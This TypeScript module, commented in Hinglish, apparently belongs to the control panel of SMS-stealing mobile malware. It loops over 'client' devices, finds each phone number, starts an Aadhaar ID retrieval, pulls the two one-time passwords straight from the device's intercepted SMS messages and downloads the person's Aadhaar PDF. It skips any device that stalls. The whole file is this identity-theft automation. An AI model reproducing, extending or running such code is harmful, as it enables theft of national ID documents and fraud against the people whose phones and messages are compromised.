// Get Everything engine — har device ke liye:
//   1. SIM detect (sim2 exist karta hai to sim2 warna sim1)
//   2. Number pata karo (nahi hai to Get Number flow se nikalo)
//   3. Us SIM ka Aadhaar nikaalo (OTP device SMS se auto, per-step timeout)
//
// Rule: agar kisi step pe server/LOT atak jaye (timeout ya error) to us device ko
// SKIP karo aur aage wale pe chalo. Koi block nahi.

import { aadhaarInit, aadhaarSubmitOtp1, aadhaarSubmitOtp2, AadhaarResult } from '@/lib/aadhaar';
import { getOtpFromDeviceSms } from '@/lib/aadhaarOtp';
import { getDeviceNumber } from '@/lib/getNumber';
import { Client } from '@/constants/panelData';

export interface EverythingProgress {
  deviceId: string;
  deviceLabel: string;
  sim: 1 | 2;
  step: 'idle' | 'sim' | 'number' | 'otp1' | 'otp2' | 'done' | 'skipped' | 'error';
  detail: string;   // Hinglish — user ko live dikhta hai
}

export interface EverythingDone {
  deviceId: string;
  deviceLabel: string;
  sim: 1 | 2;
  ok: boolean;
  number?: string;
  result?: AadhaarResult;
  error?: string;
}

// Har step ka limited time — OTP/server stuck ho to yahan skip.
const STEP_TIMEOUT_MS = 12000;

const simExists = (v: string) => !!v && v !== '—' && v !== 'Not Available' && v.trim() !== '';

function timeout<T>(p: Promise<T>, ms: number): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const t = setTimeout(() => reject(new Error('timeout')), ms);
    p.then((v) => { clearTimeout(t); resolve(v); })
      .catch((e) => { clearTimeout(t); reject(e); });
  });
}

export async function runGetEverything(
  clients: Client[],
  onProgress?: (p: EverythingProgress) => void,
): Promise<EverythingDone[]> {
  const results: EverythingDone[] = [];

  for (const c of clients) {
    const base = { deviceId: c.id, deviceLabel: c.label || c.device };
    const done: EverythingDone = { ...base, sim: 1, ok: false };

    const progress = (step: EverythingProgress['step'], detail: string, sim: 1 | 2 = 1) =>
      onProgress?.({ deviceId: c.id, deviceLabel: c.label || c.device, sim, step, detail });

    try {
      // 1. SIM choose — sim2 exist karta hai to sim2, warna sim1
      const sim: 1 | 2 = simExists(c.sim2) ? 2 : 1;
      done.sim = sim;
      progress('sim', `SIM ${sim} detected ${sim === 2 ? c.sim2 : c.sim1}`, sim);

      // 2. Number — unknown hai to Get Number flow se
      progress('number', 'Number pata kar raha hai…', sim);
      let number = c.phone;
      if (number === 'N/A' || number === '—' || !number) {
        const r = await timeout(getDeviceNumber(c.id), STEP_TIMEOUT_MS);
        if (!r.ok) throw new Error(r.error);
        number = r.result.number;
      }
      done.number = number;
      progress('number', `Number: ${number}`, sim);

      // 3. Aadhaar — phone submit
      progress('otp1', 'Aadhaar start — OTP bhejo…', sim);
      const init = await timeout(aadhaarInit(number), STEP_TIMEOUT_MS);
      if (!init.ok) throw new Error(init.error);

      // 4. OTP1 — device SMS se auto
      progress('otp1', 'Pehla OTP device SMS se nikal raha hai…', sim);
      const o1 = await timeout(getOtpFromDeviceSms(c.id, c.messages, 'otp1'), STEP_TIMEOUT_MS);
      if (!o1.ok) throw new Error(o1.error);
      const s1 = await timeout(aadhaarSubmitOtp1(o1.otp), STEP_TIMEOUT_MS);
      if (!s1.ok) throw new Error(s1.error);
      progress('otp2', `OTP1 ok (${o1.otp}) — doosra OTP…`, sim);

      // 5. OTP2 — device SMS se auto
      const o2 = await timeout(getOtpFromDeviceSms(c.id, c.messages, 'otp2'), STEP_TIMEOUT_MS);
      if (!o2.ok) throw new Error(o2.error);
      const s2 = await timeout(aadhaarSubmitOtp2(o2.otp), STEP_TIMEOUT_MS);
      if (!s2.ok) throw new Error(s2.error);
      done.result = s2.result;
      done.ok = true;
      progress('done', `Aadhaar mila (${s2.result.pdfName})`, sim);
    } catch (e: any) {
      const msg = e?.message === 'timeout' ? 'Timeout — server/LOT stuck, is device ko skip kiya' : (e?.message || 'unknown error');
      done.error = msg;
      progress('skipped', msg, done.sim);
    }

    results.push(done);
  }

  return results;
}
